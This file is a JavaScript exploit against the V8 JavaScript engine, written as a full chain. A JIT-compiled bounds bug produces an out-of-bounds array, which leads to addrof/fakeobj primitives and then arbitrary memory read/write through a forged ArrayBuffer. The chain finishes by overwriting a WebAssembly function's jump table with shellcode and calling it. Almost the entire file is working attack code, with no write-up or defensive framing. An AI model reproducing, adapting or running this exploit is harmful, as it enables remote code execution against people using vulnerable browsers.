
let conversion_buffer = new ArrayBuffer(8);
let float_view = new Float64Array(conversion_buffer);
let int_view = new BigUint64Array(conversion_buffer);
BigInt.prototype.hex = function() {
  return '0x' + this.toString(16);
};
BigInt.prototype.i2f = function() {
  int_view[0] = this;
  return float_view[0];
}
BigInt.prototype.smi2f = function() {
  int_view[0] = this << 32n;
  return float_view[0];
}
Number.prototype.f2i = function() {
  float_view[0] = this;
  return int_view[0];
}
Number.prototype.f2smi = function() {
  float_view[0] = this;
  return int_view[0] >> 32n;
}
Number.prototype.i2f = function() {
  return BigInt(this).i2f();
}
Number.prototype.smi2f = function() {
  return BigInt(this).smi2f();
}

function log(line) {
    try {
        var str = new Date().toISOString() + ": " + line;
        // jsconsole
        console.log(str);
        // dom
        document.write(str + "<br/>");
        // web server
        var request = new XMLHttpRequest();
        request.open("GET", "/log?str=" + str, false);
        request.send();
    } catch(e) {} // ignore errors
}

function trigger() {
    var x = -Infinity;
    var k = 0;
    for (var i = 0; i < 1; i += x) {
        if (i == -Infinity) {
            x = +Infinity;
        }

        if (++k > 10) {
            break;
        }
    }

    var value = Math.max(i, 1024);
    value = -value;
    value = Math.max(value, -1025);
    value = -value;
    value -= 1022;
    value >>= 1; // *** 3 ***
    value += 10; //

    var evil = Array(value);
    evil[0] = 1.1;
    var victim = new Array(0x10);
    victim[0] = Array;
    return [evil, victim];
};

class RelativeRW {

    constructor(bigarr, victim) {
        this.bigarr = bigarr;
        this.victim = victim;
        log("RelativeRW with bigaddr.length = 0x" + this.bigarr.length.toString(16));
    }

    addrof(obj) {
        this.victim[0] = obj;
        return this.bigarr[12].f2i() & 0xFFFFFFFFn;
    }

    fakeobj(addr) {
        this.bigarr[12] = addr.i2f();
        return this.victim[0];
    }

    test() {
        let obj = {x: "okay"};
        let obj_addr = this.addrof(obj);
        let obj2 = this.fakeobj(obj_addr);
        return obj2.x == "okay";
    }

}

class ArbitraryRW {

    constructor(rw_rel) {
        this.rw_rel = rw_rel;
        this.controlled_ab = new ArrayBuffer(16);
        this.fake_ab = null;
        this.uint_fake_ab = null;

        let controlled_ab_addr = this.rw_rel.addrof(this.controlled_ab);
        log("controlled_ab_addr @ " + controlled_ab_addr.hex());

        let a1 = [1.1,2.2,3.3,1.1,2.2,3.3,1.1,2.2,3.3,1.1,2.2,3.3,1.1,2.2,3.3,1.1,2.2,3.3,1.1,2.2,3.3,1.1,2.2,3.3,1.1,2.2,3.3];
        let a2 = [1.1,2.2,3.3];
        let arr_fakeab = a1.concat(a2);

        let arr_fakeab_addr = this.rw_rel.addrof(arr_fakeab);
        log("arr_fakeab_addr @ " + arr_fakeab_addr.hex());

        let fakeab_addr = arr_fakeab_addr + 3n * 0x8n;
        log("fakeab_addr @ " + fakeab_addr.hex());

        let fakeab_map_addr = fakeab_addr + 4n*0x8n;
        log("fakeab_map_addr @ " + fakeab_map_addr.hex());

        // %SystemBreak();

        // let fakeab_map_metamap_addr = fakeab_addr + 7n*0x8n;
        // log("fakeab_map_metamap_addr @ " + fakeab_map_metamap_addr.hex());

        let NOPE = 0xdeadbee0n;
        let ArrayBuffer_addr = this.rw_rel.addrof(ArrayBuffer);
        let controlled_ab_proto_addr = this.rw_rel.addrof(this.controlled_ab.__proto__);

        /* ArrayBuffer */
        arr_fakeab[0] = ((NOPE << 32n) | fakeab_map_addr).i2f();              // ArrayBuffer.map - elements
        arr_fakeab[1] = ((0x4000n << 32n) | fakeab_addr).i2f();                 // elements - flags
        arr_fakeab[2] = ((0x4000n << 32n) | (controlled_ab_addr - 1n)).i2f(); // backingstore - size
        arr_fakeab[3] = ((NOPE << 32n) | NOPE).i2f();                         // embedder fields
        /* ArrayBuffer.map */
        arr_fakeab[4] = ((0x13080808n << 32n) | NOPE).i2f();                            // Map.metamap - const
        arr_fakeab[5] = ((0x082003ffn << 32n) | 0x19000423n).i2f();                     // consts
        arr_fakeab[6] = ((ArrayBuffer_addr << 32n) | controlled_ab_proto_addr).i2f();   // __proto__ ArrayBuffer
        // /* ArraBuffer.map.metamap */
        // arr_fakeab[7] = ((0x1900000an << 32n) | fakeab_map_metamap_addr).i2f(); // Metamap - flags
        // arr_fakeab[8] = ((0x002003ffn << 32n) | 0x18000084n).i2f(); // flags flags
        // arr_fakeab[9] = ((0x0n << 32n) | 0x0n).i2f(); // flags flags
        // arr_fakeab[10] = ((0x0n << 32n) | 0x0n).i2f(); // flags flags

        this.fake_ab = this.rw_rel.fakeobj(fakeab_addr);
        this.uint32_fake_ab = new Uint32Array(this.fake_ab);
    }

    read8(addr) {
        // convert addr if bigint
        if(typeof addr == "bigint") {
            addr = Number(addr);
        }

        // this.uint32_fake_ab[3] = 4; // size
        this.uint32_fake_ab[4] = addr; // backing_store

        let uint8_controlled_ab = new Uint8Array(this.controlled_ab);
        return uint8_controlled_ab[0];
    }

    write8(addr, val) {

        // convert addr if bigint
        if(typeof addr == "bigint") {
            addr = Number(addr);
        }

        // this.uint32_fake_ab[3] = 4; // size
        this.uint32_fake_ab[4] = addr; // backing_store

        let uint8_controlled_ab = new Uint8Array(this.controlled_ab);
        uint8_controlled_ab[0] = val;
    }

    read32(addr) {

        // convert addr if bigint
        if(typeof addr == "bigint") {
            addr = Number(addr);
        }

        // this.uint32_fake_ab[3] = 4; // size
        this.uint32_fake_ab[4] = addr; // backing_store

        let uint32_controlled_ab = new Uint32Array(this.controlled_ab);
        return uint32_controlled_ab[0];
    }

    write32(addr, val) {

        // convert addr if bigint
        if(typeof addr == "bigint") {
            addr = Number(addr);
        }

        // this.uint32_fake_ab[3] = 4; // size
        this.uint32_fake_ab[4] = addr; // backing_store

        let uint32_controlled_ab = new Uint32Array(this.controlled_ab);
        uint32_controlled_ab[0] = val;
    }

    test() {
        let obj = {};
        let arr = [obj,obj,obj,obj,obj,obj,obj,obj];

        let undefined_addr = this.rw_rel.addrof(undefined);
        let obj_addr = this.rw_rel.addrof(obj);
        let arr_addr = this.rw_rel.addrof(arr);
        let addr_data_addr = arr_addr + 8n * 0x4n - 1n;

        // test read
        let readed_obj_addr = this.read32(addr_data_addr);
        // test write
        this.write32(addr_data_addr+4n, Number(undefined_addr))

        return BigInt(readed_obj_addr) == obj_addr &&
               arr[1] == undefined;
    }

}

function GetWasmFunc() {
    var buffer = new Uint8Array([0,97,115,109,1,0,0,0,1,137,128,128,128,0,2,
    96,1,127,1,127,96,0,0,2,140,128,128,128,0,1,3,101,110,118,4,112,117,
    116,115,0,0,3,130,128,128,128,0,1,1,4,132,128,128,128,0,1,112,0,0,5,
    131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,146,128,128,128,0,2,6,
    109,101,109,111,114,121,2,0,5,104,101,108,108,111,0,1,10,141,128,128,
    128,0,1,135,128,128,128,0,0,65,16,16,0,26,11,11,146,128,128,128,0,1,0,
    65,16,11,12,72,101,108,108,111,32,87,111,114,108,100,0]);
    let m = new WebAssembly.Instance(new WebAssembly.Module(buffer), {env: {puts: log}});
    return m.exports.hello;
}

function main() {
    log("Let's go !")

    log("Jitting function... ");
    for(let i = 0; i < 20000; ++i) {
        trigger();
    }
    log("okay");

    let boom = trigger();
    let rw_rel = new RelativeRW(boom[0], boom[1]);
    if(!rw_rel.test()) {
        log("RelativeRW.test() returns false :(");
        return;
    }

    log("Got addrof/fakeobj with RelativeRW !");

    let rw_arb = new ArbitraryRW(rw_rel);
    if(!rw_arb.test()) {
        log("ArbitraryRW.test returns false :(");
        return;
    }

    log("Got arb read/write \o/");

    let wasm_func = GetWasmFunc();
    let wasm_func_addr = rw_rel.addrof(wasm_func);
    log("wasm_func_addr @ " + wasm_func_addr.hex());

    let WasmOffsets = { 
        shared_function_info : 3n * 0x4n,
        wasm_exported_function_data : 1 * 0x4,
        wasm_instance : 2 * 0x4,
        jump_table_start : 29 * 0x4
    };

    let shared_function_info = rw_arb.read32(wasm_func_addr - 1n + WasmOffsets.shared_function_info) - 1;
    log("shared_function_info @ 0x" + shared_function_info.toString(16));

    let wasm_exported_function_data = rw_arb.read32(shared_function_info + WasmOffsets.wasm_exported_function_data) - 1;
    log("wasm_exported_function_data @ 0x" + wasm_exported_function_data.toString(16));

    let wasm_instance = rw_arb.read32(wasm_exported_function_data + WasmOffsets.wasm_instance) - 1;
    log("wasm_instance @ 0x" + wasm_instance.toString(16));

    let jump_table_start = rw_arb.read32(wasm_instance + WasmOffsets.jump_table_start);
    log("jump_table_start @ 0x" + jump_table_start.toString(16));

    wasm_func();

    for(let i=0; i<shellcode.length; i++) {
        let addr = jump_table_start+i;
        let val = shellcode[i];
        // log("writing " + val.toString(16) + " at " + addr.toString(16));
        rw_arb.write8(addr, val);
    }

    log("calling!");
    wasm_func();

    log("ok !");
}


main();
